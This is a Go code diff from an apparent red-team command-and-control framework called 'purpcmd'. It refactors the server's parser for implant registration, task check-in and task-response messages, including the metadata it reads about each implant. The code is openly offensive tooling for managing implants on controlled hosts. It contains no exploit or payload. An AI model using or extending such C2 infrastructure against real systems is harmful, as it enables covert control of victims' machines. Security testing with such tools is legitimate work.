@@ -8,6 +8,8 @@ import (
 	"fmt"
 	"io"
 	"net/http"
+	"purpcmd/implant"
+	"purpcmd/internal"
 	"purpcmd/server/log"
 )
 
@@ -18,40 +20,39 @@ func ParseCallback(d io.ReadCloser, req *http.Request) (uint16, []byte) {
 	err := binary.Read(r, binary.BigEndian, &messageType)
 	if err != nil {
 		if err == io.EOF {
-			return NIL, []byte{}
+			return internal.NIL, []byte{}
 		}
 	}
 
-	if messageType == REG {
-		ParseAndReg(r, req)
-		return REG, []byte{}
-	} else if messageType == CHK {
-		task,err := ParseCheck(r, req)
-		if err != nil {
-			return NIL, []byte{}
-		}
-		return CHK, task
-	} else if messageType == RSP {
+	var task []byte
+	switch messageType {
+	case internal.REG:
+		err = ParseAndReg(r, req)
+	case internal.CHK:
+		task, err = ParseCheck(r, req)
+	case internal.RSP:
 		err = ParseResponse(r, req)
-		if err != nil {
-			return NIL,[]byte{}
-		}
-		return RSP, []byte{}
+	default:
+		messageType = internal.NIL
 	}
 
-	return NIL, []byte{}
+	return messageType, task
 }
 
-func ParseAndReg(r io.Reader, req *http.Request) error {
-	i := new(ImplantMetadata)
-	var arch byte
-	var dataLen uint16
+func ParseMetadata(r io.Reader, i *implant.ImplantMetadata) {
 	binary.Read(r, binary.BigEndian, &i.PID)
 	binary.Read(r, binary.BigEndian, &i.SessionID)
 	binary.Read(r, binary.BigEndian, &i.IP)
 	binary.Read(r, binary.BigEndian, &i.Port)
 	binary.Read(r, binary.BigEndian, &i.Sleep)
-	binary.Read(r, binary.BigEndian, &arch)
+	binary.Read(r, binary.BigEndian, &i.Arch)
+}
+
+func ParseAndReg(r io.Reader, req *http.Request) error {
+	i := new(implant.ImplantMetadata)
+	ParseMetadata(r, i)
+
+	var dataLen uint16
 	binary.Read(r, binary.BigEndian, &dataLen)
 
 	data := make([]byte, dataLen)
@@ -80,21 +81,10 @@ func ParseAndReg(r io.Reader, req *http.Request) error {
 
 // ParseCheck parse health check
 func ParseCheck(r io.Reader, req *http.Request) ([]byte, error) {
-	var PID uint32
-	var SessionID uint32
-	var Sleep uint32
-	var IP uint32
-	var Port uint16
-	var Arch byte
+	i := new(implant.ImplantMetadata)
+	ParseMetadata(r, i)
 
-	binary.Read(r, binary.BigEndian, &PID)
-	binary.Read(r, binary.BigEndian, &SessionID)
-	binary.Read(r, binary.BigEndian, &IP)
-	binary.Read(r, binary.BigEndian, &Port)
-	binary.Read(r, binary.BigEndian, &Sleep)
-	binary.Read(r, binary.BigEndian, &Arch)
-
-	name := fmt.Sprintf("%d", SessionID)
+	name := fmt.Sprintf("%d", i.SessionID)
 	imp := ImplantPtrByName(name)
 	if imp == nil {
 		return []byte{},errors.New("no session with name")
@@ -111,21 +101,10 @@ func ParseCheck(r io.Reader, req *http.Request) ([]byte, error) {
 }
 
 func ParseResponse(r io.Reader, req *http.Request) error {
-	var PID uint32
-	var SessionID uint32
-	var Sleep uint32
-	var IP uint32
-	var Port uint16
-	var Arch byte
+	i := new(implant.ImplantMetadata)
+	ParseMetadata(r, i)
 
-	binary.Read(r, binary.BigEndian, &PID)
-	binary.Read(r, binary.BigEndian, &SessionID)
-	binary.Read(r, binary.BigEndian, &IP)
-	binary.Read(r, binary.BigEndian, &Port)
-	binary.Read(r, binary.BigEndian, &Sleep)
-	binary.Read(r, binary.BigEndian, &Arch)
-
-	name := fmt.Sprintf("%d", SessionID)
+	name := fmt.Sprintf("%d", i.SessionID)
 	imp := ImplantPtrByName(name)
 	if imp == nil {
 		return errors.New("no session with name")
@@ -145,8 +124,9 @@ func ParseResponse(r io.Reader, req *http.Request) error {
 	binary.Read(r, binary.BigEndian, &respLen)
 	respPayload := make([]byte, respLen)
 	binary.Read(r, binary.BigEndian, &respPayload)
+	taskPtr.TaskSetResponsePayload(respPayload)
 	
 
-	log.AsyncWriteStdoutInfo(fmt.Sprintf("Response - session:%s task:%s\n\n%s\n\n", name, TaskIDStr, respPayload))
+	log.AsyncWriteStdoutInfo(fmt.Sprintf("Response - session:%s task:%s length%d\n\n%s\n\n", name, TaskIDStr, respLen, respPayload))
 	return nil
 }
